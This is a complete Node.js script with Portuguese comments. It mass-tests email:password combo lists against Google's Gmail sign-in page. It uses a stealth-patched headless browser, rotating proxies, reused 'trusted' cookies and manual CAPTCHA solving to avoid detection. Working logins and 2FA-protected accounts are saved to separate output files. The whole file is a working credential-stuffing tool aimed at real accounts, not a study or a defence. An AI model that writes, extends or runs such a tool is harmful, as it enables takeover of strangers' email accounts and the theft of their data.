const fs = require('fs');
const os = require('os');
const path = require('path');
const readline = require('readline');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

// Ativa Stealth
puppeteer.use(StealthPlugin());

if (!fs.existsSync('./config.json')) {
    console.error("Config não encontrado.");
    process.exit(1);
}

const config = JSON.parse(fs.readFileSync('./config.json', 'utf-8'));
const LOG_FILE = 'debug.log';
const DUMP_DIR = 'debug_dumps';
const USER_DATA_DIR = './user_data';
const COOKIES_FILE = 'trusted_cookies.json';

if (config.loglevel >= 6 && !fs.existsSync(DUMP_DIR)) fs.mkdirSync(DUMP_DIR);
const OUTPUT_2FA = config.OUTPUT_2FA || 'gmail_ok_2fa.txt';
const OUTPUT_TESTED = config.OUTPUT_TESTED || 'gmail_testados.txt';

// Logger
const logger = (msg, level) => {
    if (config.loglevel === 0) return;
    const showOnScreen = (config.loglevel >= level) || (config.loglevel === 6);
    const time = new Date().toLocaleTimeString();
    
    if (showOnScreen) {
        let color = "\x1b[37m";
        if (level === 1) color = "\x1b[33m"; 
        if (level === 5) color = "\x1b[36m"; 
        console.log(`${color}[${time}] ${msg}\x1b[0m`);
    }
    if (config.loglevel >= 1) fs.appendFileSync(LOG_FILE, `[${time}] ${msg}\n`);
};

// Limpeza de String
const cleanString = (str) => {
    if (!str) return "";
    return str.replace(/^\uFEFF/, '').trim();
};

// === PROXY HELPERS ===
const loadProxies = () => {
    if (!fs.existsSync(config.PROXY_FILE)) return [];
    return fs.readFileSync(config.PROXY_FILE, 'utf-8')
        .split(/\r?\n/)
        .map(l => cleanString(l))
        .filter(l => l && !l.toUpperCase().startsWith('X'));
};

const getRandomProxy = (proxyList, lastUsed) => {
    if (proxyList.length === 0) return null;
    if (proxyList.length === 1) return proxyList[0];
    let candidate;
    let attempts = 0;
    do {
        candidate = proxyList[Math.floor(Math.random() * proxyList.length)];
        attempts++;
    } while (candidate === lastUsed && attempts < 10);
    return candidate;
};

const parseProxy = (proxyString) => {
    if (!proxyString) return null;
    const parts = proxyString.split(':');
    if (parts.length === 2) return { server: `${parts[0]}:${parts[1]}`, auth: null, original: proxyString };
    if (parts.length === 4) return { server: `${parts[0]}:${parts[1]}`, auth: { username: parts[2], password: parts[3] }, original: proxyString };
    return null;
};

const markProxyAsBad = (proxyString) => {
    if (!proxyString) return;
    try {
        const content = fs.readFileSync(config.PROXY_FILE, 'utf-8');
        const newContent = content.replace(proxyString, `X ${proxyString} -- [DEAD ${new Date().toLocaleTimeString()}]`);
        fs.writeFileSync(config.PROXY_FILE, newContent);
        logger(`[PROXY] Marcada como DEAD: ${proxyString}`, 1);
    } catch (e) {}
};

const getMemoryQuota = () => {
    const totalMemBytes = os.totalmem();
    const totalMemMB = Math.floor(totalMemBytes / 1024 / 1024);
    const limitPercent = config.MAX_MEMORY_PERCENT || 50;
    const quotaMB = Math.floor(totalMemMB * (limitPercent / 100));
    return { totalMemMB, limitPercent, quotaMB };
};

// === COOKIES ===
const loadTrustedCookies = async (page) => {
    if (fs.existsSync(COOKIES_FILE)) {
        try {
            const cookiesString = fs.readFileSync(COOKIES_FILE);
            const cookies = JSON.parse(cookiesString);
            if (cookies.length > 0) {
                await page.setCookie(...cookies);
                logger(`[COOKIES] ${cookies.length} cookies de confiança carregados.`, 5);
            }
        } catch (e) {
            logger(`[COOKIES] Erro ao carregar arquivo: ${e.message}`, 1);
        }
    }
};

const saveTrustedCookies = async (page) => {
    try {
        const cookies = await page.cookies();
        fs.writeFileSync(COOKIES_FILE, JSON.stringify(cookies, null, 2));
        logger(`[COOKIES] Sessão salva! Browser agora é mais confiável.`, 5);
    } catch (e) {}
};

const saveDebugData = async (page, email, tag) => {
    if (config.loglevel < 6) return;
    if (!page) return;
    try {
        const safeEmail = email.replace(/[^a-z0-9]/gi, '_');
        const timestamp = Date.now();
        const filename = `${safeEmail}_${tag}_${timestamp}`;
        const htmlContent = await page.content();
        fs.writeFileSync(path.join(DUMP_DIR, `${filename}.log`), htmlContent);
        console.log(`\n\x1b[32m========== RAW HTML (${tag}) ==========\x1b[0m`);
        console.log(htmlContent); 
        console.log(`\x1b[32m========== END RAW HTML ==========\x1b[0m\n`);
        await page.screenshot({ path: path.join(DUMP_DIR, `${filename}.png`) });
    } catch (e) {}
};

// === MENU INTERATIVO ===
const askUserAction = async (email) => {
    process.stdout.write('\x07'); 
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });

    console.log(`\n\x1b[41m\x1b[37m [!] CAPTCHA BLOQUEANTE PARA: ${email} \x1b[0m`);
    console.log(`\x1b[33mO navegador está oculto. Opções:\x1b[0m`);
    console.log(`1 - Abrir navegador VISÍVEL para eu resolver.`);
    console.log(`2 - Pular esta conta.`);
    console.log(`3 - Parar o script.`);

    return new Promise(resolve => {
        rl.question('\nEscolha [1, 2 ou 3]: ', (answer) => {
            rl.close();
            resolve(answer.trim());
        });
    });
};

// === DIGITAÇÃO ===
const secureType = async (page, selector, text) => {
    const maxRetries = 3;
    for (let i = 0; i < maxRetries; i++) {
        try {
            await page.waitForSelector(selector, { visible: true, timeout: 5000 });
            try { await page.bringToFront(); } catch(e) {}

            await page.click(selector, { clickCount: 3 });
            await page.keyboard.press('Backspace');
            await page.type(selector, text, { delay: 50 });

            let val = await page.$eval(selector, el => el.value);
            if (val === text) return true;

            // Fallback JS
            await page.evaluate((sel, txt) => {
                const input = document.querySelector(sel);
                input.value = txt;
                input.dispatchEvent(new Event('input', { bubbles: true }));
                input.dispatchEvent(new Event('change', { bubbles: true }));
            }, selector, text);

            await page.type(selector, ' ');
            await page.keyboard.press('Backspace');

            val = await page.$eval(selector, el => el.value);
            if (val === text) return true;

        } catch (e) {
            logger(`[ERRO INPUT] Tentativa ${i+1} falhou: ${e.message}`, 1);
        }
        await new Promise(r => setTimeout(r, 1000));
    }
    return false;
};

// === CHECK SESSION ===
const checkAccountSession = async (email, senha, proxyData, memoryQuota, forceVisible = false) => {
    let browser = null;
    let page = null;
    let pid = null;

    try {
        const launchArgs = [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled',
            '--window-size=1280,720',
            `--user-data-dir=${USER_DATA_DIR}`
        ];

        if (proxyData) {
            launchArgs.push(`--proxy-server=${proxyData.server}`);
        }

        const isHeadless = forceVisible ? false : config.HEADLESS;
        
        logger(`Iniciando navegador (${isHeadless ? 'Oculto' : 'Visível'})...`, 5);
        
        browser = await puppeteer.launch({ 
            headless: isHeadless, 
            args: launchArgs,
            defaultViewport: null
        });
        
        pid = browser.process().pid;
        const pages = await browser.pages();
        page = pages.length > 0 ? pages[0] : await browser.newPage();

        // Autenticação no Proxy
        if (proxyData && proxyData.auth) {
            await page.authenticate(proxyData.auth);
            logger(`[PROXY] Autenticado.`, 5);
        }

        await page.setExtraHTTPHeaders({ 'Accept-Language': 'en-US,en;q=0.9' });
        await loadTrustedCookies(page);

        logger(`Acessando Login...`, 3);
        try {
            await page.goto('https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin', { waitUntil: 'networkidle2' });
        } catch (navError) {
            try { await page.reload({ waitUntil: 'networkidle2' }); } catch(e) { return { res: 'ERRO REDE', cor: '31', pid }; }
        }

        const emailSelector = 'input[type="email"]';
        try {
            await page.waitForSelector(emailSelector, { timeout: 8000 });
        } catch (e) {
            if ((await page.content()).includes('Use another account')) {
                const [btn] = await page.$x("//div[contains(text(), 'Use another account') or contains(text(), 'Usar outra conta')]");
                if (btn) await btn.click();
                await page.waitForSelector(emailSelector);
            } else {
                return { res: 'ERRO CARREGAMENTO', cor: '31', pid };
            }
        }

        if (!await secureType(page, emailSelector, email)) {
            return { res: 'ERRO DIGITAR EMAIL', cor: '31', pid };
        }
        await new Promise(r => setTimeout(r, 500));
        await page.keyboard.press('Enter');

        try {
            await page.waitForSelector('input[type="password"]', { visible: true, timeout: 6000 });
            logger(`E-mail aceito.`, 3);
            await saveTrustedCookies(page);
        } catch (e) {
            const content = await page.content();
            
            if (content.includes('captcha') || content.includes('image') || content.includes('recaptcha')) {
                
                if (forceVisible) {
                    logger(`\x1b[33m[!] MODO MANUAL: Resolva o Captcha na tela (120s)...\x1b[0m`, 1);
                    try {
                        await page.waitForSelector('input[type="password"]', { visible: true, timeout: 120000 });
                        logger(`Captcha resolvido!`, 2);
                        await saveTrustedCookies(page);
                    } catch (t) {
                        return { res: 'TIMEOUT CAPTCHA', cor: '31', pid };
                    }
                } 
                else {
                    const action = await askUserAction(email);
                    
                    if (action === '1') {
                        logger(`Reiniciando em modo VISÍVEL...`, 3);
                        await browser.close();
                        return checkAccountSession(email, senha, proxyData, memoryQuota, true); 
                    } 
                    else if (action === '3') {
                        process.exit(0);
                    } 
                    else {
                        return { res: 'PULADO', cor: '33', pid };
                    }
                }
            } 
            else if (content.includes('Couldn\'t find your Google Account')) {
                return { res: 'EMAIL INEXISTENTE', cor: '31', pid };
            }
            else {
                return { res: 'ERRO DESCONHECIDO', cor: '31', pid };
            }
        }

        await new Promise(r => setTimeout(r, 1000));
        
        const passVal = await page.$eval('input[type="password"]', el => el.value);
        if (!passVal) {
             await secureType(page, 'input[type="password"]', senha);
        }
        
        await page.keyboard.press('Enter');
        logger(`Validando senha...`, 3);

        const result = await Promise.race([
            page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 }).then(() => 'NAV'),
            page.waitForFunction(() => {
                const body = document.body.innerText;
                return body.includes('Wrong password') || body.includes('Senha incorreta') || body.includes('tente novamente');
            }, { timeout: 15000 }).then(() => 'PASS_ERROR'),
            page.waitForFunction(() => {
                return document.querySelector('input[type="password"]')?.getAttribute('aria-invalid') === 'true';
            }, { timeout: 15000 }).then(() => 'PASS_ERROR')
        ]).catch(() => 'TIMEOUT');

        if (result === 'PASS_ERROR') return { res: 'SENHA INCORRETA', cor: '31', pid };
        if (result === 'TIMEOUT') {
            if (await page.$('input[type="password"]')) return { res: 'SENHA INCORRETA', cor: '31', pid };
            return { res: 'DESCONHECIDO', cor: '37', pid };
        }

        const url = page.url();
        
        if (url.includes('myaccount') || url.includes('mail.google') || url.includes('inbox')) {
            await saveTrustedCookies(page);
            return { res: 'VÁLIDO', cor: '32', pid };
        }
        
        if (url.includes('challenge')) {
            await saveTrustedCookies(page);
            return { res: 'VÁLIDO (REQ. 2FA)', cor: '33', pid };
        }

        return { res: 'DESCONHECIDO', cor: '37', pid };

    } catch (err) {
        if (err.message.includes('closed') || err.message.includes('target')) return { res: 'REINICIADO', cor: '33', pid };
        return { res: 'ERRO CRÍTICO', cor: '31', pid };
    } finally {
        if (browser) await browser.close();
    }
};

const forceKillProcess = (pid) => {
    if (!pid) return;
    try { process.kill(pid, 'SIGKILL'); } catch (e) {}
};

const iniciar = async () => {
    const arquivo = config.MODO === "testes" ? config.INPUT_TESTES : config.INPUT_GMAIL;
    if (!fs.existsSync(arquivo)) return console.log("Arquivo input ausente.");

    const testedAccounts = new Set();
    if (config.MODO !== 'testes' && fs.existsSync(config.OUTPUT_TESTED)) {
        fs.readFileSync(config.OUTPUT_TESTED, 'utf-8').split(/\r?\n/).forEach(l => testedAccounts.add(l.trim()));
    }

    const savedAccounts = new Set();
    if (fs.existsSync(config.OUTPUT_GMAIL)) fs.readFileSync(config.OUTPUT_GMAIL, 'utf-8').split(/\r?\n/).forEach(l => savedAccounts.add(l.trim()));

    let allLines = fs.readFileSync(arquivo, 'utf-8')
        .split(/\r?\n/)
        .map(l => cleanString(l))
        .filter(l => l.includes(':'));
    
    // FILTRAGEM (Restaurada com validação de senha)
    let queue = allLines.filter(line => {
        const [user, pass] = line.split(':');
        
        // 1. DOMÍNIO
        if (!user || !user.toLowerCase().endsWith('@gmail.com')) {
            return false;
        }

        // 2. SENHA MÍNIMA (Nova correção solicitada)
        if (!pass || pass.trim().length < 8) {
            return false;
        }

        // 3. CACHE
        if (config.MODO !== 'testes') {
            if (testedAccounts.has(line.trim()) || savedAccounts.has(line.trim())) return false;
        }
        
        return true;
    });

    let activeProxies = config.USE_PROXY ? loadProxies() : [];
    const quota = getMemoryQuota();
    const proxyStatus = config.USE_PROXY ? `ON (${activeProxies.length} ativas)` : 'OFF';

    console.log(`\x1b[1m=== MODO: ${config.MODO} | PROXY: ${proxyStatus} | PERFIL: PERSISTENTE ===\x1b[0m`);
    console.log(`\x1b[36m=== FILA: ${queue.length} contas válidas ===\x1b[0m\n`);

    let count = 0;
    let lastUsedProxy = null;

    while (queue.length > 0) {
        const index = (config.LEITURA === 'RANDOMICO') ? Math.floor(Math.random() * queue.length) : 0;
        const line = queue[index];
        queue.splice(index, 1);
        count++;

        const [user, pass] = line.split(':');
        
        let proxyData = null;
        let displayProxy = "DIRECT";
        
        if (config.USE_PROXY && activeProxies.length > 0) {
            const rawProxy = getRandomProxy(activeProxies, lastUsedProxy);
            lastUsedProxy = rawProxy;
            proxyData = parseProxy(rawProxy);
            if (proxyData) displayProxy = proxyData.server;
        }

        process.stdout.write(`[${count}] [P: ${displayProxy}] ${user} ... `);

        const result = await checkAccountSession(user, pass, proxyData, quota, false);

        process.stdout.clearLine();
        process.stdout.cursorTo(0);
        console.log(`[${count}] ${user} -> \x1b[${result.cor}m[${result.res}]\x1b[0m`);

        if (result.res === 'VÁLIDO') fs.appendFileSync(config.OUTPUT_GMAIL, line + '\n');
        if (result.res.includes('2FA')) fs.appendFileSync(OUTPUT_2FA, line + '\n');
        if (config.MODO !== 'testes') fs.appendFileSync(OUTPUT_TESTED, line + '\n');
        
        if (result.res.includes('FALHA PROXY') && proxyData) markProxyAsBad(proxyData.original);

        if (queue.length > 0) await new Promise(r => setTimeout(r, config.DELAY_LINEAR));
    }
    console.log("Fim.");
};

iniciar();